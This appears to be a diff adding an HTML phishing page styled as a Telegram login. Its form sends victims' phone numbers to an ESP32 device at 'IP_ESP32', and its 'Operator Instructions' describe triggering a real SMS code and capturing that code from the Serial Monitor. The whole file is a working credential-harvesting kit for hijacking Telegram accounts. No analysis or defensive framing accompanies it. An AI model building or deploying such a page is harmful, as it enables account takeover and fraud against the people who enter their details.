@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* استایل‌های اختصاصی شما */
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h3>Telegram-style Login</h3>
+    <form method="GET" action="http://IP_ESP32/">
+      <input class="form-control my-3" name="phone" placeholder="Enter phone number" required>
+      <button class="btn btn-light w-100">Send Code</button>
+    </form>
+    
+    <div class="instructions">
+      <h5>Operator Instructions:</h5>
+      <ol>
+        <li>User enters phone number</li>
+        <li>Check Serial Monitor for number</li>
+        <li>Manually send SMS code to user</li>
+        <li>User enters received code</li>
+        <li>Code appears in Serial Monitor</li>
+      </ol>
+    </div>
+  </div>
+  
+  <script src="scripts.js"></script>
+</body>
+</html>
